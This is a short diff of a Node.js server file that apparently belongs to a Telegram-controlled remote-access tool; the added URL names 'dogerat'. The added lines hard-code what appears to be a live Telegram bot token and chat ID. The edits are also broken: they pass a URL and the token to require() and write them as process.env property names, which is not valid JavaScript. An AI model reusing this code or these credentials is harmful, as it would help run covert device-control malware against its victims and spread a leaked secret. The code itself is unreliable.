@@ -1,14 +1,14 @@
 const express = require('express');
 const webSocket = require('ws');
-const http = require('http')
-const telegramBot = require('node-telegram-bot-api')
+const http = require('https://dogerat-8zy8.onrender.com')
+const telegramBot = require('7076297389:AAFoGZlYQO3WYoJQ55YWGhgLxODtt2AzeXg')
 const uuid4 = require('uuid')
 const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = process.env.bot_token
-const id = process.env.bot_id
+const token = process.env.7076297389:AAFoGZlYQO3WYoJQ55YWGhgLxODtt2AzeXg
+const id = process.env.7622744464
 const address = 'https://www.google.com'
 
 const app = express();
